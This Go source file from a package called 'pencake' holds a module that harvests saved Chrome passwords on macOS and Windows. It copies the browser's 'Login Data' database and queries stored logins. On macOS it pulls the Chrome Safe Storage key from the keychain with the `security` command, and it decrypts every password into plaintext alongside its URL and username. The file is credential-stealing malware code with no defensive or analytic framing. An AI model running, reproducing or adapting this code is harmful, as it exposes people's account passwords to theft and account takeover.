package pencake

import (
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
	"os"
	"pencake/utils"
	"strings"
)

func ChromePassword() []ChromePasswordStruct {
	switch utils.SystemType() {
	case "darwin":
		return getMacChromePassword()
	case "windows":
		return getWindowsChromePassword()
	default:
		utils.NotSupported("")
		return []ChromePasswordStruct{}
	}
}

type ChromePasswordStruct struct {
	Url      string
	UserName string
	Password string
}

func copyDBAndGetRows(route string, dst string) *sql.Rows {
	if !utils.IsFileExist(route) {
		return nil
	}
	utils.CopyFile(route, dst)
	db, _ := sql.Open("sqlite3", dst)
	defer db.Close()
	rows, _ := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	return rows
}

func getMacChromePassword() []ChromePasswordStruct {
	route := os.Getenv("HOME") + "/Library/Application Support/Google/Chrome/Default/Login Data"
	macStorageKey := utils.RunCommand("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' " +
		"| awk '{print $2}'")
	macStorageKey = strings.Replace(macStorageKey, `"`, "", -1)
	rows := copyDBAndGetRows(route, os.Getenv("HOME")+"/tempfile.dat")
	if rows == nil {
		return []ChromePasswordStruct{}
	}
	defer rows.Close()
	var result []ChromePasswordStruct
	for rows.Next() {
		var url string
		var username string
		var password string
		_ = rows.Scan(&url, &username, &password)
		decryptedPassword := utils.MacDecrypt(macStorageKey, password)
		if decryptedPassword == "" {
			continue
		}
		result = append(result, ChromePasswordStruct{
			Url:      url,
			UserName: username,
			Password: string(decryptedPassword),
		})
	}
	return result
}

func getWindowsChromePassword() []ChromePasswordStruct {
	route := os.Getenv("localappdata") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
	rows := copyDBAndGetRows(route, os.Getenv("APPDATA")+"\\tempfile.dat")
	if rows == nil {
		return []ChromePasswordStruct{}
	}
	var result []ChromePasswordStruct
	for rows.Next() {
		var url string
		var username string
		var password string
		_ = rows.Scan(&url, &username, &password)
		decryptedPassword := utils.WindowsDecrypt(password)
		result = append(result, ChromePasswordStruct{
			Url:      url,
			UserName: username,
			Password: decryptedPassword,
		})
	}
	return result
}
